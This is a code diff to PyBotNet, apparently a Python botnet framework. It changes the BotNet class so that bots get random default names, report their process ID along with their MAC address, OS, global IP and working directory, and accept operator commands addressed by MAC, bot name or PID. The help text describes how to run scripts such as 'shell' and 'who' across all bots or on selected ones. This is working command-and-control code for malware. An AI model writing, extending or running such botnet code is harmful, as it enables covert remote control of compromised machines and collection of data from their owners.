@@ -6,6 +6,8 @@ import platform
 import datetime
 import logging
 import inspect
+import random
+import string
 import uuid
 import time
 import os
@@ -30,7 +32,7 @@ class BotNet:
         self,
         engine: "BaseEngine" = None,
         *,
-        bot_name: str = "no_name",
+        bot_name: str = None,
         version: str = "0.1.0",
         delay: int = 1.5,
         use_default_scripts: bool = True,
@@ -39,6 +41,9 @@ class BotNet:
         **extra,
     ):
         self.engine = engine
+        if bot_name is None:
+            bot_name = "".join(random.choices(string.ascii_letters, k=5))
+
         self.BOT_NAME = str(bot_name).strip().replace(" ", "_")
 
         self.version = version
@@ -116,27 +121,56 @@ class BotNet:
 
     def _help(self, script_name=None) -> str:
         all_scripts_name = list(self.scripts.keys())
-        all_scripts_name.extend(["help", "start"])
-        all_scripts_name = "\n".join(all_scripts_name)
-        help_str = f"""All scripts name: \n\n{all_scripts_name} 
+        all_scripts_name.extend(["help"])
+        all_scripts_name = "\n    ".join(all_scripts_name)
+        help_str = f"""
+# All scripts name:
+    {all_scripts_name} 
 
-Get more details about a script:
+# Get more details about a script:
     `/help script-name`
-
-Run script Syntax:
-    `/[SCRIPT-NAME] [params]`
-    or
-    `[mac-address] /[SCRIPT-NAME] [params]`
-    or
-    `[BOT-NAME] /[SCRIPT-NAME] [params]`
-
     Example:
-        `/echo hi`
-        `94945035671481 /echo hi`
-        `bot_name /echo hi`
+        `/help shell`
 
-PyBotNet version: {__version__}
-Docs: {__github_link__}
+# Run a script:
+    
+    - For all bots:
+
+    `/[SCRIPT-NAME] [params]`
+        Example: 
+            `/echo hi`
+            `/who`
+
+    - For Select specific bot: 
+
+    `[mac-address] /[SCRIPT-NAME] [params]`
+        Example:
+            `{str(uuid.getnode())} /echo hi`
+            `{str(uuid.getnode())} /who`
+
+    `[BOT-NAME] /[SCRIPT-NAME] [params]`
+        Example:
+            `{self.BOT_NAME} /echo hi`
+            `{self.BOT_NAME} /who`
+
+    `[pid] /[SCRIPT-NAME] [params]`
+        Example:
+            `{str(os.getpid())} {self.BOT_NAME} /echo hi`
+            `{str(os.getpid())} {self.BOT_NAME} /who`
+
+    `[mac-address] [pid] /[SCRIPT-NAME] [params]`
+        Example:
+            `{str(uuid.getnode())} {str(os.getpid())} /echo hi`
+            `{str(uuid.getnode())} {str(os.getpid())} /who`
+
+    `[mac-address] [BOT-NAME] /[SCRIPT-NAME] [params]`
+        Example:
+            `{str(uuid.getnode())} {self.BOT_NAME} /echo hi`
+            `{str(uuid.getnode())} {self.BOT_NAME} /who`
+
+
+# PyBotNet version: {__version__}
+# Docs: {__github_link__}
 """
         if script_name:
             if script_name in ["help", "start"]:
@@ -186,6 +220,7 @@ Docs: {__github_link__}
         minimal_info = {
             "scripts_name": list(self.scripts),
             "mac_addres": uuid.getnode(),
+            "pid": os.getpid(),
             "bot_name": self.BOT_NAME,
             "os": platform.system(),
             "global_ip": get_global_ip(),
@@ -213,7 +248,6 @@ Docs: {__github_link__}
                 seconds=round((time.time() - self.__run_time))
             ),
             "current_route": os.getcwd(),
-            "pid": os.getpid(),
             "cpu_count": os.cpu_count(),
             "pybotnet_version": __version__,
         }
@@ -263,13 +297,13 @@ Docs: {__github_link__}
                 _logger.debug(f"Engine[{self.engine}] Error: {e}")
                 command = False
 
-            # check for mac_addres or self.BOT_NAME
+            # check for mac_addres, self.BOT_NAME or PID
             if self._valid_command(command, expected_length=2):
-                if command[0] in [str(uuid.getnode()), self.BOT_NAME]:
-                    command = command[1:]
+                command_prefix = [str(uuid.getnode()), self.BOT_NAME, str(os.getpid())]
+                for _ in command_prefix:
+                    if command[0] in command_prefix:
+                        command = command[1:]
 
-                if command[0] in [str(uuid.getnode()), self.BOT_NAME]:
-                    command = command[1:]
 
             if not self._valid_command(command, check_slash=True):
                 _logger.debug("<There is no command to execute>")
